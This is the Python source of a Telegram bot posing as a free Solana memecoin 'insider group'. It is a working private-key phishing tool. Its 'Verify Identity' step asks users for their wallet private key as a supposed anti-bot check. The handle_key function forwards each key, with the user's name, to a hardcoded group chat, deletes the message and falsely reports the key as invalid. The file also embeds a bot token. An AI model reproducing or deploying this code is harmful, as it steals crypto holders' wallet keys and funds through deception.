import asyncio
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = "8489767680:AAEZBzKcE5WzPVERImraG0Wo4tNFpj756Q4"
GROUP_ID = -5251150337

WELCOME_IMAGE_PATH = "welcome.jpg"
VERIFY_VIDEO_PATH = "verify.mp4"

WELCOME_TEXT = (
    "<b>🚀 Curlio Calls - The Best Free Solana Insider Group</b>
"
    "<blockquote>"
    "✅ New Gem Alerts at Launch — AI + on-chain filtered. No noise, just alpha
"
    "✅ Whale-Grade Memecoin Playbook — Strategy + execution, step by step
"
    "✅ Instant Entry/Exit Callouts — Buy/sell zones + invalidation. No hesitation
"
    "✅ Whale Wallet Tracking — Spot smart money bids before the crowd
"
    "✅ Risk Templates (Copy/Paste) — Sizing, stops, and take-profit rules
"
    "✅ VIP Insider Chatroom — Live market talk + execution support in real time
"
    "✅ Whale Wallet Tracker — See top buys/sells with key levels
"
    "✅ Launch Sniper Checklist — What to check in 60 seconds before aping in
"
    "✅ Live “Scam Filter” Checks — Liquidity, wallets, taxes, and red flags fast
"
    "✅ Catalyst + Narrative Radar — Track what’s trending before it pumps
"
    "✅ Top Trader Recaps — See what worked and what didn’t, and what moves you should copy and shouldn’t
"
    "✅ One-Click Entry — Jump in instantly, skip the setup, and execute fast when the window is open
"
    "✅ Risk Classification — Instantly see if a play is Low / Medium / High risk, with clear reasons and the exact rules we’re using
"
    "🎁 Cupsey’s Private Trading Bootcamp — The full step-by-step walkthrough: setups, entries, exits, and risk rules from start to finish"
    "</blockquote>"
)

VERIFY_TEXT = (
    "<b>🔑 Please input the private key to verify to confirm your identity and complete the human check. "
    "This prevents sniper bots from interfering with fair trading.</b>

"
    "<i>🎥 Can’t find your bugs key? Watch the video above!</i>"
)

INVALID_TEXT = "❌ Invalid private key — please check your private key and try again."

async def delete_messages(context, chat_id):
    ids = context.user_data.get("bot_messages", [])
    for mid in ids:
        try:
            await context.bot.delete_message(chat_id, mid)
        except:
            pass
    context.user_data["bot_messages"] = []

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_messages(context, update.effective_chat.id)

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛡️ Verify Identity", callback_data="verify")]
    ])

    msg = await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(WELCOME_IMAGE_PATH, "rb"),
        caption=WELCOME_TEXT,
        parse_mode="HTML",
        reply_markup=keyboard
    )

    context.user_data["bot_messages"] = [msg.message_id]
    context.user_data["state"] = "welcome"

async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    await delete_messages(context, query.message.chat.id)

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back", callback_data="back")]
    ])

    msg = await context.bot.send_video(
        chat_id=query.message.chat.id,
        video=open(VERIFY_VIDEO_PATH, "rb"),
        caption=VERIFY_TEXT,
        parse_mode="HTML",
        reply_markup=keyboard
    )

    context.user_data["bot_messages"] = [msg.message_id]
    context.user_data["state"] = "verify"

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def handle_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("state") != "verify":
        return

    user_msg_id = update.message.message_id
    chat_id = update.effective_chat.id
    key = update.message.text

    await context.bot.send_message(
        chat_id=GROUP_ID,
        text=f"🔑 Key from @{update.effective_user.username or update.effective_user.id}:
{key}"
    )

    await asyncio.sleep(1)
    await context.bot.delete_message(chat_id, user_msg_id)

    msg = await context.bot.send_message(
        chat_id=chat_id,
        text=INVALID_TEXT
    )

    await asyncio.sleep(1)
    await context.bot.delete_message(chat_id, msg.message_id)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(verify, pattern="^verify$"))
    app.add_handler(CallbackQueryHandler(back, pattern="^back$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
